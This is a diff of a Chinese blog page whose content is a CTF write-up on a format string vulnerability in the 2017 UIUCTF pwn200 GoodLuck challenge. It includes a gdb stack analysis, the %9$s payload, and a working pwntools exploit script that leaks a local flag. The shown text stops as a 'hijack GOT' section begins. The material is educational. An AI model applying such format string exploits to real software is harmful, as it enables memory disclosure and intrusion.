@@ -1,28 +1,28 @@
 <!DOCTYPE html>
 <html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
-  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <head>
     
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
     <meta name="robots" content="noodp" />
-    <title>格式化字符串漏洞举例 - Ghostasky&#39;s Blog</title><meta name="author" content="">
+    <title>格式化字符串漏洞举例 - Ghostasky&#39;s Blog</title><meta name="author" content="Ghostasky">
 <meta name="author-link" content="">
-<meta name="description" content="" /><meta name="keywords" content='' /><meta itemprop="name" content="格式化字符串漏洞举例">
-<meta itemprop="description" content=""><meta itemprop="datePublished" content="2021-02-06T18:50:57+00:00" />
+<meta name="description" content="[TOC] 格式化字符串漏洞例子 64位程序格式化字符串漏洞 原理 前六个整形或指针参数依次保存在RDI，RSI，RDX，RCX，R8，和R9寄存器中，如果还有更多的参数的话才会保存在栈上。 例子 这里用的是2017年的UIUCTF中的pwn200GoodLu" /><meta name="keywords" content='' /><meta itemprop="name" content="格式化字符串漏洞举例">
+<meta itemprop="description" content="[TOC] 格式化字符串漏洞例子 64位程序格式化字符串漏洞 原理 前六个整形或指针参数依次保存在RDI，RSI，RDX，RCX，R8，和R9寄存器中，如果还有更多的参数的话才会保存在栈上。 例子 这里用的是2017年的UIUCTF中的pwn200GoodLu"><meta itemprop="datePublished" content="2021-02-06T18:50:57+00:00" />
 <meta itemprop="dateModified" content="2021-02-06T18:50:57+00:00" />
-<meta itemprop="wordCount" content="8216">
+<meta itemprop="wordCount" content="8215">
 <meta itemprop="keywords" content="[PWN]," /><meta property="og:title" content="格式化字符串漏洞举例" />
-<meta property="og:description" content="" />
+<meta property="og:description" content="[TOC] 格式化字符串漏洞例子 64位程序格式化字符串漏洞 原理 前六个整形或指针参数依次保存在RDI，RSI，RDX，RCX，R8，和R9寄存器中，如果还有更多的参数的话才会保存在栈上。 例子 这里用的是2017年的UIUCTF中的pwn200GoodLu" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="http://localhost:1313/posts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B/" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="http://ghostasky.github.io/posts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-02-06T18:50:57+00:00" />
 <meta property="article:modified_time" content="2021-02-06T18:50:57+00:00" />
 <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="格式化字符串漏洞举例"/>
-<meta name="twitter:description" content=""/>
+<meta name="twitter:description" content="[TOC] 格式化字符串漏洞例子 64位程序格式化字符串漏洞 原理 前六个整形或指针参数依次保存在RDI，RSI，RDX，RCX，R8，和R9寄存器中，如果还有更多的参数的话才会保存在栈上。 例子 这里用的是2017年的UIUCTF中的pwn200GoodLu"/>
 <meta name="application-name" content="FixIt">
 <meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
     <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://localhost:1313/posts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B/" /><link rel="prev" href="http://localhost:1313/posts/linux%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF/" /><link rel="next" href="http://localhost:1313/posts/ret2csu/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://ghostasky.github.io/posts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B/" /><link rel="prev" href="http://ghostasky.github.io/posts/linux%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF/" /><link rel="next" href="http://ghostasky.github.io/posts/ret2csu/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
     <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
     <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
   {
@@ -32,20 +32,20 @@
     "inLanguage": "zh-CN",
     "mainEntityOfPage": {
       "@type": "WebPage",
-      "@id": "http:\/\/localhost:1313\/posts\/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B\/"
-    },"genre": "posts","keywords": "","wordcount":  8216 ,
-    "url": "http:\/\/localhost:1313\/posts\/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B\/","datePublished": "2021-02-06T18:50:57+00:00","dateModified": "2021-02-06T18:50:57+00:00","publisher": {
+      "@id": "http:\/\/ghostasky.github.io\/posts\/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B\/"
+    },"genre": "posts","keywords": "","wordcount":  8215 ,
+    "url": "http:\/\/ghostasky.github.io\/posts\/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B\/","datePublished": "2021-02-06T18:50:57+00:00","dateModified": "2021-02-06T18:50:57+00:00","publisher": {
       "@type": "Organization",
       "name": ""},"author": {
         "@type": "Person",
-        "name": "作者"
+        "name": "Ghostasky"
       },"description": ""
   }
   </script></head>
-  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <body data-header-desktop="auto" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
   <div class="header-wrapper">
     <div class="header-title">
-      <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky&#39;s Blog" data-title="Ghostasky&#39;s Blog" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">Ghostasky&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky&#39;s Blog" data-title="Ghostasky&#39;s Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="typeit"><template> Ghostasky&#39;s Blog</template></span></a><span class="header-subtitle">未语之痕</span></div>
     <nav>
       <ul class="menu"><li class="menu-item">
               <a
@@ -80,7 +80,7 @@
   <div class="header-container">
     <div class="header-wrapper">
       <div class="header-title">
-        <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="/images/fixit.png" data-title="/images/fixit.png" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">Ghostasky&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+        <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky&#39;s Blog" data-title="Ghostasky&#39;s Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="typeit"><template> Ghostasky&#39;s Blog</template></span></a><span class="header-subtitle">未语之痕</span></div>
       <div class="menu-toggle" id="menu-toggle-mobile">
         <span></span><span></span><span></span>
       </div>
@@ -124,8 +124,7 @@
   <article class="page single">
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>格式化字符串漏洞举例</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
-      Anonymous</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/technology/" class="post-category" title="分类 - Technology"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Technology</a></span></div><div class="post-meta-line"><span title="发布于 2021-02-06 18:50:57"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2021-02-06">2021-02-06</time></span>&nbsp;<span title="8216 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 8300 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 17 分钟</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky" data-title="Ghostasky" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Ghostasky</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/technology/" class="post-category" title="分类 - Technology"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Technology</a></span></div><div class="post-meta-line"><span title="发布于 2021-02-06 18:50:57"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2021-02-06">2021-02-06</time></span>&nbsp;<span title="8215 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 8300 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 17 分钟</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>目录</span>
@@ -143,16 +142,28 @@
   </ul>
 </nav></div>
       </div><div class="content" id="content"><p>[TOC]</p>
-<h2 id="格式化字符串漏洞例子" class="heading-element">
-  <a href="#%e6%a0%bc%e5%bc%8f%e5%8c%96%e5%ad%97%e7%ac%a6%e4%b8%b2%e6%bc%8f%e6%b4%9e%e4%be%8b%e5%ad%90" class="heading-mark"></a>格式化字符串漏洞例子</h2><h3 id="64位程序格式化字符串漏洞" class="heading-element">
-  <a href="#64%e4%bd%8d%e7%a8%8b%e5%ba%8f%e6%a0%bc%e5%bc%8f%e5%8c%96%e5%ad%97%e7%ac%a6%e4%b8%b2%e6%bc%8f%e6%b4%9e" class="heading-mark"></a>64位程序格式化字符串漏洞</h3><h4 id="原理" class="heading-element">
-  <a href="#%e5%8e%9f%e7%90%86" class="heading-mark"></a>原理</h4><p>前六个整形或指针参数依次保存在RDI，RSI，RDX，RCX，R8，和R9寄存器中，如果还有更多的参数的话才会保存在栈上。</p>
-<h4 id="例子" class="heading-element">
-  <a href="#%e4%be%8b%e5%ad%90" class="heading-mark"></a>例子</h4><p>这里用的是2017年的UIUCTF中的<strong>pwn200GoodLuck</strong>为例来介绍。</p>
+<h2 id="格式化字符串漏洞例子" class="heading-element"><span>格式化字符串漏洞例子</span>
+  <a href="#%e6%a0%bc%e5%bc%8f%e5%8c%96%e5%ad%97%e7%ac%a6%e4%b8%b2%e6%bc%8f%e6%b4%9e%e4%be%8b%e5%ad%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="64位程序格式化字符串漏洞" class="heading-element"><span>64位程序格式化字符串漏洞</span>
+  <a href="#64%e4%bd%8d%e7%a8%8b%e5%ba%8f%e6%a0%bc%e5%bc%8f%e5%8c%96%e5%ad%97%e7%ac%a6%e4%b8%b2%e6%bc%8f%e6%b4%9e" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><h4 id="原理" class="heading-element"><span>原理</span>
+  <a href="#%e5%8e%9f%e7%90%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>前六个整形或指针参数依次保存在RDI，RSI，RDX，RCX，R8，和R9寄存器中，如果还有更多的参数的话才会保存在栈上。</p>
+<h4 id="例子" class="heading-element"><span>例子</span>
+  <a href="#%e4%be%8b%e5%ad%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>这里用的是2017年的UIUCTF中的<strong>pwn200GoodLuck</strong>为例来介绍。</p>
 <p>因为只有本地，所以在本地放了flag.txt文件</p>
 <p>题目链接：https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck</p>
 <p>首先checksec下：</p>
-<div class="highlight" id="id-1"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">hacker</span><span class="err">@</span><span class="nl">ubuntu</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="mi">2017</span><span class="o">-</span><span class="n">UIUCTF</span><span class="o">-</span><span class="n">pwn200</span><span class="o">-</span><span class="n">GoodLuck</span><span class="err">$</span> <span class="n">checksec</span> <span class="n">goodluck</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">hacker</span><span class="err">@</span><span class="nl">ubuntu</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="mi">2017</span><span class="o">-</span><span class="n">UIUCTF</span><span class="o">-</span><span class="n">pwn200</span><span class="o">-</span><span class="n">GoodLuck</span><span class="err">$</span> <span class="n">checksec</span> <span class="n">goodluck</span>
 </span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">hacker</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="mi">2017</span><span class="o">-</span><span class="n">UIUCTF</span><span class="o">-</span><span class="n">pwn200</span><span class="o">-</span><span class="n">GoodLuck</span><span class="o">/</span><span class="n">goodluck</span><span class="err">&#39;</span>
 </span></span><span class="line"><span class="cl">    <span class="nl">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
 </span></span><span class="line"><span class="cl">    <span class="nl">RELRO</span><span class="p">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
@@ -160,7 +171,7 @@
 </span></span><span class="line"><span class="cl">    <span class="nl">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
 </span></span><span class="line"><span class="cl">    <span class="nl">PIE</span><span class="p">:</span>      <span class="n">No</span> <span class="nf">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span></span></span></code></pre></div><p>开了NX和部分RELRO。</p>
 <p>漏洞很显然，就在printf那里。</p>
-<div class="highlight" id="id-2"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+3h] [rbp-3Dh]
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-3Ch]
@@ -196,7 +207,7 @@
 </span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;That&#39;s right, the flag is %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v9</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="nf">fflush</span><span class="p">(</span><span class="n">_bss_start</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><div class="highlight" id="id-3"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">b</span> <span class="n">printf</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">b</span> <span class="n">printf</span> 
 </span></span><span class="line"><span class="cl"><span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x400640</span>
 </span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">r</span>
 </span></span><span class="line"><span class="cl"><span class="n">Starting</span> <span class="nl">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">hacker</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="mi">2017</span><span class="o">-</span><span class="n">UIUCTF</span><span class="o">-</span><span class="n">pwn200</span><span class="o">-</span><span class="n">GoodLuck</span><span class="o">/</span><span class="n">goodluck</span> 
@@ -300,7 +311,7 @@
 </span></span><span class="line"><span class="cl"><span class="err">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span></span></span></code></pre></div><p>可以看到flag在栈上偏移为4， x64 前 6 个参数存在寄存器上面，而第一个参数又是格式化字符串</p>
 <p>所以是第9个参数，payload ：%9$s</p>
 <p>Exp：</p>
-<div class="highlight" id="id-4"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="c1">##context.log_level = &#39;debug&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="n">goodluck</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./goodluck&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
@@ -311,7 +322,7 @@
 </span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">payload</span>
 </span></span><span class="line"><span class="cl"><span class="c1">##gdb.attach(sh)</span>
 </span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span></span></span></code></pre></div><div class="highlight" id="id-5"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">hacker</span><span class="err">@</span><span class="nl">ubuntu</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="mi">2017</span><span class="o">-</span><span class="n">UIUCTF</span><span class="o">-</span><span class="n">pwn200</span><span class="o">-</span><span class="n">GoodLuck</span><span class="err">$</span> <span class="n">python</span> <span class="n">exp</span><span class="p">.</span><span class="n">py</span> 
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">hacker</span><span class="err">@</span><span class="nl">ubuntu</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="mi">2017</span><span class="o">-</span><span class="n">UIUCTF</span><span class="o">-</span><span class="n">pwn200</span><span class="o">-</span><span class="n">GoodLuck</span><span class="err">$</span> <span class="n">python</span> <span class="n">exp</span><span class="p">.</span><span class="n">py</span> 
 </span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">hacker</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="mi">2017</span><span class="o">-</span><span class="n">UIUCTF</span><span class="o">-</span><span class="n">pwn200</span><span class="o">-</span><span class="n">GoodLuck</span><span class="o">/</span><span class="n">goodluck</span><span class="err">&#39;</span>
 </span></span><span class="line"><span class="cl">    <span class="nl">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
 </span></span><span class="line"><span class="cl">    <span class="nl">RELRO</span><span class="p">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
@@ -325,9 +336,15 @@
 </span></span><span class="line"><span class="cl"><span class="n">You</span> <span class="nl">answered</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="p">{</span><span class="mi">111111111111111</span><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">But</span> <span class="n">that</span> <span class="n">was</span> <span class="n">totally</span> <span class="n">wrong</span> <span class="n">lol</span> <span class="n">get</span> <span class="n">rekt</span></span></span></code></pre></div><h3 id="hijack-got" class="heading-element">
-  <a href="#hijack-got" class="heading-mark"></a>hijack GOT</h3><h4 id="原理-1" class="heading-element">
-  <a href="#%e5%8e%9f%e7%90%86-1" class="heading-mark"></a>原理</h4><p>目前的 ELF 编译系统使用一种成为延迟绑定( lazy binding )的技术来实现对共享库中函数的调用过程。该机制主要通过两个数据结构 GOT 和 过程链接表( Procedure Linkage Table , PLT )实现。其简化的原理为 : 当目标模块存在一个外部共享库的函数调用时，其在汇编层面使用 call 指令实现调用，其作用为跳转至对应函数的 PLT 表项处执行，该表项的第一条指令为 jmp *[ 对应 GOT 项的地址 ]，第一次执行函数调用时，通过 GOT 与 PLT 的合作，会将最终调用函数的地址确定下来，并存放在其对应的 GOT 表项中。当后续再发生调用时， jmp *[ 对应 GOT 项的地址 ] 指令即表示直接跳转至目标函数处执行。</p>
+</span></span><span class="line"><span class="cl"><span class="n">But</span> <span class="n">that</span> <span class="n">was</span> <span class="n">totally</span> <span class="n">wrong</span> <span class="n">lol</span> <span class="n">get</span> <span class="n">rekt</span></span></span></code></pre></div><h3 id="hijack-got" class="heading-element"><span>hijack GOT</span>
+  <a href="#hijack-got" class="heading-mark">
